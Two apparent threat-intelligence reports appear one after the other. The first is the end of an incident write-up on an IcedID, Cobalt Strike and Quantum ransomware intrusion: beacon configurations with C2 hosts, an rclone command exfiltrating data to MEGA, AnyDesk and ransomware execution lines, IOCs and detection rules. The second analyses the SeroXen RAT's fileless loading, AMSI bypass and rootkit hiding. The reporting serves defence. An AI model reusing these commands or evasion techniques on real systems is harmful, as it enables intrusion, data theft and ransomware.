Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows: { "beacontype": [ "HTTPS" ], "sleeptime": 5000, "jitter": 28, "maxgetsize": 1865903, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 0, "cfg_caution": false, "kill_date": null, "server": { "hostname": "fazehotafa.com", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/ak.css", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "prepend 1767 characters", "base64", "base64url" ] } }, "http-post": { "uri": "/profile", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 9369, "startrwx": false, "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==", "transform-x86": [ "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Configurations for other Cobalt Strike servers observed: { "beacontype": [ "HTTPS" ], "sleeptime": 60000, "jitter": 0, "maxgetsize": 1048576, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 0, "cfg_caution": false, "kill_date": null, "server": { "hostname": "111.90.143.191", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/j.ad", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print" ] } }, "http-post": { "uri": "/submit.php", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 0, "startrwx": true, "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==", "transform-x86": null, "transform-x64": null, "userwx": true }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": false }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } { "beacontype": [ "HTTPS" ], "sleeptime": 60000, "jitter": 0, "maxgetsize": 1048576, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 305419776, "cfg_caution": false, "kill_date": null, "server": { "hostname": "78.128.112.139", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/ga.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print" ] } }, "http-post": { "uri": "/submit.php", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\rundll32.exe", "spawnto_x64": "%windir%\\sysnative\\rundll32.exe" }, "process-inject": { "allocator": "VirtualAllocEx", "execute": [ "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 0, "startrwx": true, "stub": "tUr+Aexqde3zXhpE+L05KQ==", "transform-x86": null, "transform-x64": null, "userwx": true }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": false }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Remote Access Software As shown above, three different Remote Access Software were used by the threat actor: It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel. 
The AnyDesk service password was set manually using the command line as shown below: 
powershell -np -w
hidden -encodedcommand JABzAD0ATgBlAHcAL
[.....] --> CS beacon --> "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s
-NoLogo
-NoProfile --> C:\Windows\system32\cmd.exe /C cmd.exe /c
[email protected]#_!
| C:\ProgramData\anydesk.exe --set-password 
The software packages were bundled within a single Microsoft Software Installer (MSI) package, named hp.msi.
This was installed from the ProgramData folder, resulting in the installation of the remote management tools.
The activity can be correlated against the Application log for MSI installer events (Event ID 1033). 
During the intrusion, the threat actors were observed accessing collected data such as ShareFinder.txt using Notepad and then copying the contents to the clipboard. 
Whilst the process activity indicated Active Directory accounts being used, correlating this activity to Clipboard activity indicated matching sessions, process IDs, and the true source of the user. 
In this case, ShareFinder.txt was created in the ProgramData folder by the ShareFinder.ps1 script.
Approximately 2 seconds later, the threat actors accessed this file and copied the contents. 
While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors’ workstation was revealed in several Windows logs.
Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230.
This host name was also in the Security events: 
For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation.
The client address was the internal workstation where the RDP traffic was being proxied through. 
Exfiltrated Documents Opened Remotely During the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14.
This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels. 
Rclone On the backup server, rclone.exe was used in order to exfiltrate data to a MEGA cloud storage. rclone.exe copy --max-age 5y "\\[REDACTED BACKUP]\E:\[REDACTED]\" remote:Groups --exclude "*.{psd,7z,dwg,rar,MTS,MOV,pst,PRF,mp3,skp,tmp,gcp,zip,ZIP,MP4,tiff,ava4,psb,tif,DNG,AVI,FIT,FIL,mp4,dxf,mov,rcs,mdb,iso,json,man,exe,gz,ISO,dll,BAK,bak,tib,MP3,tar,m4v,vmdk,vm,PBD,db,BAKDB,icon,msi,ai,gif,cab,iso,png,eps,lib,avi,msg,crs,LIB,CRS,mpg,dcm,tif}" -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P From the rclone.exe configuration file, we can retrieve the user’s mail address and password. 
Mega user account: 
[email protected] Alert Interestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike.
Its unclear why the operator chose to do this, as this was around three hours prior to the ransomware being executed or a ransom note being dropped. 
The alert message that was visible: The activity can be observed in the PowerShell WinEvent logs: 
Ransomware 
The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion.
Around 40 minutes after creating the alert messages for Cobalt Strike to show up, they dropped locker_64.exe on the backup server.
They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity.
The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments: 64.exe /[email protected] The threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed. 
The threat actor then tried again on a different server using a DLL this time: rundll32 locker_32.dll,run /[email protected] Again, only execution on the server was observed.
They then executed a new Cobalt Strike PowerShell beacon on a 3rd server and executed the ramsomware using that. 
"c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile ➝ C:\Windows\system32\cmd.exe /C
locker_64.exe They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again.
After only affecting the single host, the threat actors dropped several batch scripts on the server: pass.bat 1.bat 2.bat The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors. 
There were more than 1,000 Windows Security Event ID 4724 events generated within a two minute period. 
This password reset would enable the next scripts to function as intended while also hampering any recovery activity. 
The 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment. 
Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts. 
When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts. 
The HTML message was dropped in various directories across the endpoints: 
The HTML file displayed the all but familiar message: 
The following Locker files were then deleted: Diamond Model Atomic IcedID: alockajilly.com zoomersoidfor.com choifejuce.lol opiransiuera.com erinindiaka.quest opiransiuera.com zoomersoidfor.com considerf.info antiflamez.bar www.onlinecloud.cloud 64.227.12.180:80 5.196.103.145:443 66.63.188.70:443 178.128.85.30:443 5.252.177.10:443 46.101.19.119:443 Cobalt Strike: fazehotafa.com guteyutu.com 45.66.151.109 172.93.181.165 111.90.143.191 78.128.112.139 Mega User: 
[email protected][.]me Attacker Infrastructure: 
199.127.60[.]117 199.101.184[.]230 Computed Invoice-09-28#268_PDF.iso 515047b6ce410001696812bc85e197d1 26b11c95a6a324dbb0ab32428361b0531234ecee 68f971a1b391f809058e83058a2037d29c28a8a21fd618b0d952466c632ff1be documents.lnk 1af7a0e058ce1b63b138a1425a835561 66b8da857c6dc45dea3a9fb17a503b3c2d203245 1ee563caf943d3a7ed315dda9c37f0c9c445eec6dfb78ae196d2989626a0dfec eyewear.bat 0d51c60c67c62836ba0f7948113b3737 a597205ed55b6e6413a17edb62cbb29bda735676 999cba918c297bf0b0d7d4aa9003e6338cc300a9270cc758d1d108c26603417d easygoing.dat f102a95e749d1ee63c71df902856ae51 fda81b5951bb02ef0236088c310d9bc4fa70e1e6 f27d924911a7087928012764358bad9240b2ba8aeeca5e0d717abdbb82344981 rapuab1.dll ce1b0e77a31da8dc68f77a977b04f3e4 5facd0aa9a29e0768ab9f432c79eac173af69711 163800b0fbf1b1b7bbc7f719df421ed717111c7c9ddea9c9b41f898ee22dd51a 9bd6b1f24b9589a3fbc1d54b6e6184b8 f8473c6c8b298a3d72c8ca890667eddab62d2ba8 03a9d6afc99e70333723d921bd1265ac948cdabb8b15689b5ceb1c02365a9572 beacA.dll 1b1497c2758ff5a8ade2df336a7a6c2d d6cc874f84797813c225318b877eace04ca5f5a1 47ed0d1c7d8abc159d1eb2bb9fbe037f38b0846217cc11132652734f93ad5678 beaconM-1664297797-T0B9Z_32-cr.exe dbb08886c60f3c44b377d09bd9d8b6d3 7262b7df4d90409fb141856d9b55792872deda20 8f7cc7cc14a12753d41678981b929546d12218d457a9d22951808cb5f19e549c df5ce1159ef2e257df92e1825d786d87 a7e163eaa0fc2afb9c0d5ac6f79cb3e49919dd3c 842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031 AD.bat e77f23aac8db0d23196b6bef64fe04fc 90bf77e194970dd74d1b49faf58ae395ce49bb34 c2ebcc389304539bc13c3d2023cf88f9ea0bac7210fefa03f8333eaab0bbb76d ns.bat 7ac356035fce31e9e14c3a3d371ddf41 61f838d9b0998ab23877e86f6e8ba3551799e07c 4f52c7448bdcb4caa2eff701b0f3b60b406aea278ecd5a3b23cac808a65418e7 92edbbeff775928cfc6e3c8efefe4ecc fffa0ce086791c41360971e3ce6a0d1af1701616 fc4da07183de876a2b8ed1b35ec1e2657400da9d99a313452162399c519dbfc6 955d0cf317efe48bf0394330fcd82ebb d84d40038311e188e25c78389b51b900de9c69bd e9da08831e0d4395f697e4f18c87be941bf52c79d84da1cc88186bdea1ebf4f4 lsass.dll adc50d0c1e7bf37288a612a0f278e028 6254e8cca47d87f29e85627a08ba88b79915a459 fafc84466c1ce361bb6ce219bde2b64ca07a6a6feda23f444749ba06c44b0580 397020072f5787dbbc0c344f98623bbd 970e793c86266b20d280c04e0f41ec7ae9c2093c 6511d6e84343c2d3a4cd36853170509e2751e27c86f67c6a031dc88e7e495e48 601d613bff412d245e3edf46dc499d83 a39b9119003c63583e2a0f11f19f3e6050399176 2a2c83a7c8cd33e45dc14b8d955e00161580d6d2736f4e75a235aa3eb2f21528 locker_32.dll 131d277cfbc9f4b2d667150d84ad503d f05ff93ee4d2f31bc70c0484a559d562203b7700 a378b8e9173f4a5469e7b5105be40723af29cbd6ee00d3b13ff437dae4514dff license.dat b31de50a57e8cb73c9efda8b97ffa261 a7e3f617644599ec695da84d140a7b69c392a421 55be890947d021fcc8c29af3c7aaf70d8132f222e944719c Network ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike ET Threatview.io High Confidence Cobalt Strike C2 IP group 2 ET INFO Pastebin-style Service (textbin .net in TLS SNI) ET INFO Splashtop Domain (splashtop .com) in TLS SNI ET INFO Splashtop Domain in DNS Lookup (splashtop .com) 
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert ET POLICY PE EXE or DLL Windows file download HTTP ET INFO Dotted Quad Host DLL Request ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response ET HUNTING Suspicious lsass.exe in URI ET MALWARE Win32/IcedID Request Cookie ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS
AnyDesk Remote Desktop Software User-Agent ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472) 
Sigma Yara win_cobalt_strike_auto CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18041/18041.yar Spearphishing Attachment - T1566.001 Windows Management Instrumentation - T1047 Windows Command Shell - T1059.003 Malicious File - T1204.002 PowerShell - T1086 Service Execution - T1035 Scheduled Task - T1053.005 Exploitation for Privilege Escalation - T1068 Access Token Manipulation - T1134 Regsvr32 - T1218.010 Rundll32 - T1218.011 DCSync - T1003.006 LSASS Memory - T1003.001 Domain Trust Discovery - T1482 System Information Discovery - T1082 
Remote System Discovery - T1018 Group Policy Discovery - T1615 System Language Discovery - T1614.001 System Time Discovery - T1124 Network Share Discovery - T1135 Domain Account - T1087.002 File and Directory Discovery - T1083 
Remote Desktop Protocol - T1021.001 SMB/Windows Admin Shares - T1021.002 Lateral Tool Transfer - T1570 Windows Remote Management - T1021.006 Local Data Staging - T1074.001 Web Protocols - T1071.001 Exfiltration to Cloud Storage - T1567.002 Data Encrypted for Impact - T1486 Account Access Removal - T1531 Disable or Modify Tools - T1562.001 Mark-of-the-Web Bypass - T1553.005 System Owner/User Discovery - T1033 S0002 - Mimikatz S0154 - Cobalt Strike S0359 - Nltest S0039 - Net S0096 - Systeminfo S0100 - IPconfig S0552 - AdFind Internal case #18041 
title: SeroXen RAT for sale url: https://www.cybersecurity-insiders.com/seroxen-rat-for-sale/ This blog was jointly written with Alejandro Prada and Ofer Caspi. 
Executive summary SeroXen is a new Remote Access Trojan (RAT) that showed up in late 2022 and is becoming more popular in 2023.
Advertised as a legitimate tool that gives access to your computers undetected, it is being sold for only $30 for a monthly license or $60 for a lifetime bundle, making it accessible. 
Key takeaways: SeroXen is a fileless RAT, performing well at evading detections on static and dynamic analysis. 
The malware combines several open-source projects to improve its capabilities.
It is a combination of Quasar RAT, r77-rootkit and the command line NirCmd. 
Hundreds of samples have shown up since its creation, being most popular in the gaming community.
It is only a matter of time before it is used to target companies instead of individual users. 
Analysis Quasar RAT is a legitimate open-source remote administration tool.
It is offered on github page to provide user support or employee monitoring.
It has been historically associated with malicious activity performed by threat actors, APT groups (like in this Mandiant report from 2017), or government attacks (in this report by Unit42 in 2017). 
It was first released in July 2014 as “xRAT” and renamed to “Quasar” in August 2015.
Since then, there have been released updates to the code until v1.4.1 in March 2023, which is the most current version.
As an open-source RAT tool with updates 9 years after its creation, it is no surprise that it continues to be a common tool used by itself or combined with other payloads by threat actors up to this day. 
In a review of the most recent samples, a new Quasar variant was observed by Alien Labs in the wild: SeroXen.
This new RAT is a modified branch of the open-source version, adding some modifications features to the original RAT.
They’re selling it for monthly or lifetime fee.
Figure 1 contains some of the features advertised on their website. 
Figure 1.
SeroXen features announced on its website. 
This new RAT first showed up on a Twitter account, established in September 2022.
The person advertising the RAT appeared to be an English-speaking teenager.
The same Twitter handle published a review of the RAT on YouTube.
The video approached the review from an attacking/Red Team point of view, encouraging people to buy the tool because it is worth the money.
They were claiming to be a reseller of the tool. 
In December 2022, a specific domain was registered to market/sell the tool, seroxen[.]com.
The RAT was distributed via a monthly license for $30 USD or a lifetime license of $60 USD.
It was around that time that the malware was first observed in the wild, appearing with 0 detections on VirusTotal. 
After a few months, on the 1st of February, the YouTuber CyberSec Zaado published a video alerting the community about the capabilities of the RAT from a defensive perspective.
In late February, the RAT was advertised on social media platforms such as TikTok, Twitter, YouTube, and several cracking forums, including hackforums.
There were some conversations on gaming forums complaining about being infected by malware after downloading some video games.
The artifacts described by the users matched with SeroXen RAT. 
The threat actor updated the domain name to seroxen[.]net by the end of March.
This domain name was registered on March 27th, 2023, after seroxen[.]com was decommissioned.
The threat actor used GoDaddy for registration and Cloudflare for hosting the website.
These domains are only used for selling and marketing purposes, and not for Command and Control (C&C) communications. 
Figure 2: SeroXen website Based on the packed versions uploaded to VT, it appears that the RAT is being used for targeting video game users.
Several lure injector cheat files have been observed with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2.
The threat actor used Discord for the distribution of some of the samples. Figure 3.
SeroXen timeline. 
One of the most relevant announced features is that it is a fully undetectable version.
This is currently true from a static analysis point of view, since the RAT is packaged into an obfuscated PowerShell batch file.
The file’s size typically ranges between 12-14 megabytes, as we can see in sample 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 uploaded to VT on May 21.
Due to its relatively large size, certain antivirus may choose not to analyze it, potentially bypassing detection.
This sample currently has 0 detections on VT, but some of the crowdsourced Sigma Rules do detect the activity as suspicious. 
As the malware is fileless and executed only in memory after going through several decryptions and decompression routines, it is more difficult to detect by antiviruses.
In addition, its rootkit loads a fresh copy of ntdll.dll, which makes it harder to detect by Endpoint Detection & Response (EDR) solutions that hook into it to detect process injections. 
Regarding the dynamic analysis, it is worth noting that some sandbox environments might fail to detect the RAT due to its utilization of several techniques to evade virtualization and sandbox detection mechanisms and string encryption subsequent payloads. 
The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system’s manufacturer.
This enables it to identify virtualization environments such as VMware and abort the execution to delay and make the analysis harder.
The RAT also checks for the presence of debuggers and uses pings make the threads sleep. 
Currently, most child processes and files dropped during the execution of the RAT have a low detection rate. 
Execution analysis When the malicious payload is delivered to the victim, commonly through a phishing mail or a Discord channel – the victim often receives a ZIP file containing a benign file in plain sight, and the heavily obfuscated batch file is hidden and automatically executed when launched.
The bat file format is always very similar and looks like the contents of Figure 4, followed by base64 encoded text later in the file. 
Figure 4.
Obfuscated bat script. 
During the bat execution, the script extracts two separate binaries from the base64 encoded text, AES decrypts, and GZIP decompresses it to produce two separate byte arrays.
These byte arrays are then used with .NET reflection to perform an in-memory load of the assembly from its bytes, locate the binary’s entry point, and perform an Invoke on both. 
Throughout the decryption process, the attackers had the need to create a legitimate looking folder to drop an illicit version of the System Configuration Utility msconfig.exe that is required later.
For this purpose, the script creates the folder “C:Windows System32”, with a space after Windows and deletes it as soon as the utility is running.
If it wasn’t for this file temporarily dropped into disk, the RAT would be fully fileless. 
The execution of one of the above-mentioned binaries leads to another obfuscated binary carrying an embedded resource.
This resource is hidden behind anti-sandboxing and debugger techniques, only to lead to more obfuscation and encryption techniques that lead to the final payload.
This payload has been built using the Github project Costura, which allows SeroXen to pack the code’s dependencies into the .NET assembly so it can run self-contained. 
Figure 5.
Payload embedded resources. 
The extraction of the resources leads to the final payloads.
This is in the form of two .NET assemblies: CSStub2.InstallStager.exe, and CSStub2.UninstallStager.exe.
And a Win32 binary called CSStub2.$sxr-nircmd.exe, which corresponds to the unmodified command-line utility NirCmd. 
The payload InstallStager.exe is a compilation of the open-source rootkit named r77-rootkit – a fileless ring 3 rootkit written in .NET.
This rootkit supports both x32 and x64 Windows processes and has the following features: Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process. 
Child process hooking. 
Option to embed additional malware to be executed with the rootkit – in this case NirCmd and/or Quasar.
The added malware will be decompressed and decrypted before it is injected into other processes. 
In memory process injection: the rootkit injects itself and additional malware(s) into all processes.
Injection is done from memory: no files are needed to be stored on disk. 
Hooking: Hooks several functions from ntdll.dll to hide its presence. 
Communicating via NamedPipe:
The rootkit can receive a command from any running process. 
Antivirus / EDR evasion:
The rootkit uses several evasion techniques: AMSI bypass: PowerShell inline script patches “amsi.dll!AmsiScanBuffer” to always return “AMSI_RESULT_CLEAN”. 
DLL unhooking: Removes EDR hooks by loading a fresh copy of “ntdll.dll” from disk to avoid process hollowing detection Hiding entities: Hiding all entities starts with a configurable prefix, which in SeroXen’s case its “$sxr”.
This prefix hardens the visualization of the attack on the system, but eases attribution of the malware family during the analysis.
The prefix is used to hide files, directories, NamedPipes, scheduled tasks, processes, registry keys/values, and services. 
R77 technical documentation provides a guideline of where can the prefix be found: Config parameter Details Example HIDE_PREFIX The prefix for name-based hiding (e.g. processes, files, etc…). 
L”$sxr” R77_SERVICE_NAME32 Name for the scheduled task that starts the r77 service for 32-bit processes. 
HIDE_PREFIX L”svc32″ R77_SERVICE_NAME64 Name for the scheduled task that starts the r77 service for 64-bit processes. 
HIDE_PREFIX L”svc64″ CHILD_PROCESS_PIPE_NAME32 Name for the named pipe that notifies the 32-bit r77 service about new child processes. 
L”.pipe” HIDE_PREFIX L”childproc32″ CHILD_PROCESS_PIPE_NAME64 Name for the named pipe that notifies the 64-bit r77 service about new child processes. 
L”.pipe” HIDE_PREFIX L”childproc64″ CONTROL_PIPE_NAME Name for the named pipe that receives commands from external processes. 
L”.pipe” HIDE_PREFIX L”control” The two main components in this project are the InstallStager service and the Rootkit.
The InstallStager service is responsible for: Creating a registry key to store the malware code and writes it as encrypted data. 
Creating a scheduled task to execute the malware using PowerShell.
PowerShell will decompress and decrypt the final payload (Service) that will be injected into the winlogon.exe process and executed via dllhost.exe using process hollowing techniques. 
Figure 6.
Starting payload after decryption using process hollowing. 
Now the second and main stage of the Rootkit is ready to start.
The service kicks off the load of the rootkit’s DLL that is embedded as a resource and saves its configuration as a registry key.
(In SeroXen case it’s
[HKEY_LOCAL_MACHINESOFTWARE$sxrconfig]). 
The service creates 3 listener threads: NewProcessListener: Enumerates all running processes and injects the rootkit when new processes are created. 
ChildProcessListener: Injects the rootkit to a newly created process by another process and updates the callee via NamedPipe. Figure 7.
Child process injection. 
ControlPipeListener: Creates a NamedPipe to receive commands from any process.
Supported commands are listed below: Command Details CONTROL_R77_UNINSTALL The control code that uninstalls r77. 
CONTROL_R77_PAUSE_INJECTION 
The control code that temporarily pauses injection of new processes. 
CONTROL_R77_RESUME_INJECTION The control code that resumes injection of new processes. 
CONTROL_PROCESSES_INJECT The control code that injects r77 into a specific process, if it is not yet injected. CONTROL_PROCESSES_INJECT_ALL 
The control code that injects r77 into all processes that are not yet injected. 
CONTROL_PROCESSES_DETACH The control code detaches r77 from a specific process. 
CONTROL_PROCESSES_DETACH_ALL 
The control code detaches r77 from all processes. 
CONTROL_USER_SHELLEXEC 
The control code that executes a file using ShellExecute. 
CONTROL_USER_RUNPE The control code that executes an executable using process hollowing. 
CONTROL_SYSTEM_BSOD The control code that triggers a BSOD. 
CONTROL_R77_TERMINATE_SERVICE The control code that terminates the r77 service. 
The DLL rootkit carries out process injections, executes commands received by other processes, and keeps out of sight any sign of SeroXen being executed within the system. 
Figure 8.
System function hooking. 
As a summary of the execution process: Figure 9.
SeroXen decryption flow. 
Since Seroxen is based on QuasarRAT, the C&C server utilizes the same Common Name in their TLS certificate.
The functionalities offered by the threat actor for the C&C server closely mirror those found in the Quasar Github repository, including support for TCP network streams (both IPv4 and IPv6), efficient network serialization, compression using QuickLZ, and secure communication through TLS encryption. Figure 10.
Quasar Server Certificate. 
Conclusion The SeroXen developer has found a formidable combination of free resources to develop a hard to detect in static and dynamic analysis RAT.
The use of an elaborated open-source RAT like Quasar, with almost a decade since its first appearance, makes an advantageous foundation for the RAT.
While the combination of NirCMD and r77-rootkit are logical additions to the mix, since they make the tool more elusive and harder to detect. 
The Alien Labs team will continue to monitor the threat landscape for SeroXen samples and infrastructure. 
Detection methods The following associated detection methods are in use by Alien Labs.
They can be used by readers to tune or deploy detections in their own environments or for aiding additional research. 
SURICATA IDS SIGNATURES 2035595:
ET TROJAN Generic AsyncRAT Style SSL Cert 2027619:
ET TROJAN Observed Malicious SSL Cert (Quasar CnC) Associated indicators (IOCs) 
The following technical indicators are associated with the reported intelligence.
A list of indicators is also available in the OTX Pulse.
Please note, the pulse may include other activities related but out of the scope of the report. 
TYPE INDICATOR DESCRIPTION SHA256 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 Example malware hash Mapped to MITRE ATT&CK The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques: 
TA0002 : Execution T1053: Scheduled Task/Job T1053.005:
Scheduled Task T1059: Command and Scripting Interpreter T1059.003:
